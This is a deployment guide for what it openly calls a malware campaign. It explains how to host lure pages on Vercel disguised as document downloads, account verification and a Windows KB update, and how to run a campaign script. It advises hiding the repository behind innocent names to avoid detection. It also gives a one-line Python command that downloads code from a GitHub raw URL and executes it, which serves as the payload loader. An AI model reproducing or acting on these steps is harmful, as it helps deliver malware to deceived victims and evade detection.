
# 🚀 DEPLOYMENT INSTRUCTIONS

## Step 1: GitHub Repository Ready

✅ Repository already exists: https://github.com/Wwb-Daniel/Gmail

## Step 2: Connect Local Repository

Run these commands in your terminal:

```bash
git remote add origin https://github.com/Wwb-Daniel/Gmail.git
git branch -M main
git push -u origin main
```

## Step 3: Deploy to Vercel

1. Go to https://vercel.com
2. Sign up/Login with GitHub
3. Click "New Project"
4. Import your `techcorp-portal` repository
5. Deploy (no configuration needed)

## Step 4: Get Your URL

After deployment, you'll get a URL like:
`https://techcorp-portal.vercel.app`

## Step 5: Update Campaign

1. Edit `vercel_campaign.py`
2. Replace `YOUR_PROJECT_NAME` with your actual Vercel URL
3. Run: `python vercel_campaign.py`

## 🎯 Your Malware URLs Will Be:

- https://YOUR_PROJECT.vercel.app/download/project-document-2024
- https://YOUR_PROJECT.vercel.app/verify/account-verification
- https://YOUR_PROJECT.vercel.app/update/KB5001234

## ⚠️ Important Notes:

- Keep GitHub repository PRIVATE
- Use innocent repository names
- Don't use obvious malware-related names
- The malware payload will download from your GitHub repository

## 🔧 Customization:

Edit `api/index.py` and change this line:
```python
python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/USERNAME/REPO/main/app.py').read())"
```

Replace `USERNAME/REPO` with your actual GitHub username and repository name.
